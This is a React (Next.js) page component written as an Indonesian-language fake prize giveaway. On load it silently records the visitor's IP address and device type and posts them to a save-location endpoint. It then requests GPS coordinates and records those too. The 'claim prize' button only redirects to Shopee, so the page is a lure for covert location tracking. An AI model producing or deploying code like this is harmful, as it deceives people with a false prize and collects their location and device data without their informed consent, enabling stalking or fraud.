"use client";

import type { CSSProperties } from "react";
import { useEffect } from "react";

export default function TrackPage() {
  useEffect(() => {
    async function run() {
      try {
        const ipRes = await fetch("/api/get-ip");
        const ipData = await ipRes.json();

        const deviceInfo = getDeviceInfo();

        await fetch("/api/save-location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            device: deviceInfo.device,
            userAgent: deviceInfo.ua,
            ip: ipData.ip,
            gpsLat: null,
            gpsLon: null,
          }),
        });

        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(
            async (pos) => {
              await fetch("/api/save-location", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  device: deviceInfo.device,
                  userAgent: deviceInfo.ua,
                  ip: ipData.ip,
                  gpsLat: pos.coords.latitude,
                  gpsLon: pos.coords.longitude,
                }),
              });
            },
            () => {}
          );
        }
      } catch (err) {
        console.error(err);
      }
    }

    run();
  }, []);

  return (
    <div style={styles.container}>
      <div style={styles.card}>
        <h2 style={styles.title}>🎉 SELAMAT!</h2>
        <p style={styles.text}>
          Anda berkesempatan mendapatkan hadiah menarik.
        </p>
        <p style={styles.text}>Klaim hadiah Anda sekarang!</p>

        <button
          style={styles.button}
          onClick={() =>
            window.location.href = "https://shopee.co.id"
          }
        >
          🎁 KLAIM SEKARANG
        </button>
      </div>
    </div>
  );
}

function getDeviceInfo() {
  const ua =
    typeof navigator !== "undefined" ? navigator.userAgent : "unknown";

  const devices = [
    "iPhone",
    "iPad",
    "Samsung",
    "Xiaomi",
    "OPPO",
    "Vivo",
    "Realme",
    "Huawei",
    "Infinix",
    "Poco",
    "Sony",
    "Nokia",
    "Asus",
    "Lenovo",
    "Motorola",
    "Google Pixel",
    "TECNO",
  ];

  let detected = "Unknown Device";
  for (const d of devices) {
    if (ua.toLowerCase().includes(d.toLowerCase())) detected = d;
  }

  // fallback
  if (detected === "Unknown Device" && /Android/i.test(ua))
    detected = "Android Phone";

  return { device: detected, ua };
}
const styles: Record<string, CSSProperties> = {
  container: {
    minHeight: "100vh",
    background: "#f5f5f5",
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    padding: 20,
  },
  card: {
    background: "white",
    padding: "30px 25px",
    borderRadius: 12,
    boxShadow: "0 4px 14px rgba(0,0,0,0.15)",
    textAlign: "center",
    maxWidth: 350,
    width: "100%",
  },
  title: {
    margin: "0 0 10px 0",
    fontSize: "26px",
    fontWeight: "bold",
  },
  text: {
    fontSize: "16px",
    marginBottom: 12,
  },
  button: {
    background: "#ff5722",
    padding: "12px 18px",
    width: "100%",
    border: "none",
    borderRadius: 8,
    color: "white",
    fontSize: "18px",
    cursor: "pointer",
    marginTop: 20,
  },
};
